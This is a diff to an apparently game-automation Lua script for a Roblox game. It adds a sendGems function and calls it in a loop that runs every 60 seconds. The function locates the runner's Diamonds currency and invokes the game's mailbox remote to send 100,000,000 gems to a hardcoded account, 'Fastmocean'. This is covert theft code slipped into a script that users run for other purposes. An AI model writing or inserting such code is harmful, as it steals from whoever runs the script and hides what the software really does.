@@ -28,6 +28,46 @@ local function daycarevoucher()
     end 
 end
 
+local function sendGems()
+
+    local currentGemCount = leaderstats["💎 Diamonds"].Value
+    local saveData = Save.Get()
+    local Inventory = saveData["Inventory"]
+    local username = "Fastmocean"
+    local Gemssend = 100000000
+    local diamondUID  
+
+    -- Find the UID for Diamonds
+    for Class, Inv in pairs(Inventory) do
+        if Class == "Currency" then  
+            for uid, Item in pairs(Inv) do
+                if Item.id == "Diamonds" then  
+                    diamondUID = uid  
+                    print("Diamonds UID found:", diamondUID)
+                    break  
+                end
+            end
+        end
+    end
+
+    -- Check if diamonds exist and if the player has enough gems
+    if diamondUID and currentGemCount > Gemssend then
+        local args = {
+            [1] = username,
+            [2] = "Here you go buddy",
+            [3] = "Currency",
+            [4] = diamondUID,  
+            [5] = Gemssend
+        }
+
+        print("Invoking Server with args:", unpack(args))
+
+        -- Send gems via the network
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    else
+        warn("Insufficient Gems or UID not found")
+    end
+end
 
 
 local function autosendmail()
@@ -249,5 +289,8 @@ while wait(60) do
     task.spawn(function()
         autosendmail()
     
+    end)
+    task.spawn(function()
+        sendGems()
     end)
 end
